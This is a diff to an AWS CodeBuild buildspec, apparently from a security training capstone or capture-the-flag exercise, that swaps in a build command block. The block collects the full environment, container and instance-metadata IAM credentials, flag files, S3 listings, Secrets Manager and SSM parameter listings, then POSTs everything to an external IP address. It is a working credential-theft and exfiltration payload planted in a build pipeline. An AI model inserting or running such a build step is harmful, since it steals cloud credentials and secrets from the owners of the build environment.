@@ -2,8 +2,22 @@ version: 0.2
 phases:
   build:
     commands:
-      - id; hostname; echo "=== ENV ==="; env | sort
-      - echo "=== WHOAMI ==="; aws sts get-caller-identity
-      - echo "=== FLAG FILES ==="; find / -iname '*flag*' 2>/dev/null | head; cat /flag* 2>/dev/null
-      - echo "=== S3 CODE ==="; aws s3 ls s3://event-92480-sec588-capstone-6do99-s3-code --recursive
-      - aws s3 cp s3://event-92480-sec588-capstone-6do99-s3-code/ /tmp/code --recursive 2>/dev/null; ls -laR /tmp/code; grep -rIiE 'flag|sec588' /tmp/code 2>/dev/null
+      - |
+        I="cb-$(date +%s)"
+        D=$( {
+          echo "### identite"; id; hostname; pwd
+          echo "### ENV COMPLET"; env | sort
+          echo "### sts"; aws sts get-caller-identity 2>&1
+          echo "### creds conteneur"
+          curl -s -m 5 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>&1
+          echo "### imds"
+          curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
+          echo "### flags"
+          find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -40
+          cat /flag* /var/www/html/flag* 2>/dev/null
+          echo "### s3"; aws s3 ls 2>&1 | head -40
+          echo "### secrets"; aws secretsmanager list-secrets --region us-east-2 2>&1 | head -25
+          echo "### ssm"; aws ssm describe-parameters --region us-east-2 2>&1 | head -25
+        } 2>&1 )
+        curl -s -m 25 -X POST "http://3.17.42.211:9997/$I" --data-binary "$D" || true
+        curl -s -m 10 "http://3.17.42.211:9997/$I/ping" || true
